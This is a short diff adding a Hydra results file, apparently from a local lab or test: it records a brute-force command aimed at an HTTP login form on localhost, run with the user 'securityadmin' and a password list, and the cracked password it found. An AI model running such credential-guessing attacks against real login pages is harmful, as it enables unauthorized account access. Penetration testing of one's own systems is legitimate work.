@@ -1,0 +1,2 @@
+# Hydra v9.6 run at 2025-11-27 00:25:01 on localhost http-post-form (hydra -l securityadmin -P passwords.txt -s 8080 -V -o hydra_results.txt localhost http-post-form /login:username=^USER^&password=^PASS^:Login failed)
+[8080][http-post-form] host: localhost   login: securityadmin   password: SuperSecure123
